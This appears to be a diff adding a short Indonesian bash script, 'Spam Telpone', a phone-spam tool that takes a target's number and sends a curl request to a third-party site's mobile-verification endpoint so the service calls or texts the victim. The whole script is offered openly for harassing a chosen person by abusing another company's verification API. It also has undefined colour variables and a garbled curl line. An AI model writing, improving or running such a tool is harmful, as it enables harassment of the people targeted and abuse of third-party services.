@@ -1,0 +1,50 @@
+#!/bin/bash
+
+blink="\033[5m";
+kosong="\033[0m";
+green="\033[32m";
+yellow="\033[33m";
+blue="\033[34m";
+cyan="\033[36m";
+red="\033[31m";
+bold="\033[1m";
+gray="\033[37m";
+ask="\e[97m[ \e[91m?\e[97m ] ";
+err="\e[97m[ \e[93m!\e[97m ] ";
+suk="\e[97m[ \e[92m+\e[97m ] ";
+
+echo -e "$blink CTRL + Z"
+echo -e "$green•$yellow============================================$green•"
+echo -e " $blue Author	   :$cyan Kafid_Renaldo          	";
+echo -e " $blue github	   :$cyan github.com/kafidrenaldo	";
+echo -e "$green•$yellow============================================$green•	";
+echo -e "$err $red info					";
+echo -e "$redbg $cyan batas spam : 03"
+echo -e "   tidak bisa pake 08/+62"
+echo -e "   Example:885876xxxxx$kosong"
+echo
+toilet -f small -F gay 		Spam Telpone
+echo 
+echo -e "$green [$lblue 01 $green] $grey spam-telp"
+echo -e "$green [$lblue 02 $green] $grey Exit tools$kosong"
+
+echo
+read -p "masukan pilihan anda : " pil
+if [ $pil = 1 ] || [ $pil = 01 ]; then
+read -p "masukan no target : " nomor
+link="https://id.jagreward.com/member/verify-mobile/$nomor"
+echo -e "$suk Spam Telepon Akan Segera Dikirim Mohon Tunggu"
+echo -e "$suk untuk menghetikan spam tekan "ctrl + c / ctrl + z" "
+echo -e "$yellow•$green=============================================$yellow•$kosong"
+curl -s $link "\n"\n 
+echo
+echo -e "$yellow•$green=============================================$yellow•$kosong"
+
+elif [ $pil = 2 ] || [ $pil = 02 ]; then
+echo 'terima kasih udah pake tools gue'
+exit
+
+else
+echo -e "$err $bold Input Salah..$red!!!"
+sh spam-telp.sh
+fi
